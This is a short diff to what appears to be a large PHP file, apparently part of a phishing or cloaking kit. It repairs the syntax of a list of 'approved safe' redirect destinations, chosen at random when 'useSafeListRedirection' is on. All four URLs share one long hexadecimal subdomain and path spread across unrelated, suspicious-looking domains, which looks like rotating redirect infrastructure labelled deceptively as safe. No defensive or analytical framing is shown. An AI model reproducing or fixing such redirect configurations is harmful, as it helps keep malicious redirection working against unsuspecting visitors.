@@ -7886,8 +7886,8 @@ $safeRedirectionUrl = '';
 
 // List of approved safe redirect destinations
 // Randomly selected when useSafeListRedirection is enabled
-$safeListRedirectionUrl = 'https://1edcaa0fe17acf540ae86c1ebe13d22b7ce6781f0352cfe53d56dc1bb5314f.fiberglassschina.cc/exbf371761202-css.html',
+$safeListRedirectionUrl = ['https://1edcaa0fe17acf540ae86c1ebe13d22b7ce6781f0352cfe53d56dc1bb5314f.fiberglassschina.cc/exbf371761202-css.html',
 'https://1edcaa0fe17acf540ae86c1ebe13d22b7ce6781f0352cfe53d56dc1bb5314f.testoriamirates.com/exbf371761202-css.html',
 'https://1edcaa0fe17acf540ae86c1ebe13d22b7ce6781f0352cfe53d56dc1bb5314f.testoriemirate.com/exbf371761202-css.html',
-'https://1edcaa0fe17acf540ae86c1ebe13d22b7ce6781f0352cfe53d56dc1bb5314f.xangohealers.com/exbf371761202-css.html'  // Add more safe URLs as needed
+'https://1edcaa0fe17acf540ae86c1ebe13d22b7ce6781f0352cfe53d56dc1bb5314f.xangohealers.com/exbf371761202-css.html']  // Add more safe URLs as needed
 ;
